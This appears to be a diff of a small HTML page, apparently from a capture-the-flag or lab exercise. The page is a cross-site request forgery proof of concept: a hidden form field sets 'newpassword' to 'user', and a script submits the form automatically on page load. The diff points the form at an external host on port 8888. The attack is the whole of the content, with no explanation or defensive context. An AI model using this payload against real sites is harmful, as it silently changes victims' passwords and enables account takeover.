@@ -7,7 +7,7 @@
     <title>user</title>
 </head>
 <body>
-    <form action="/changepassword" method="POST">
+    <form action="http://bznzzij.haobachang2.loveli.com.cn:8888/changepassword" method="POST">
     <input type="hidden" name="newpassword" value="user" />
     <script>document.forms[0].submit();</script>
     </form>
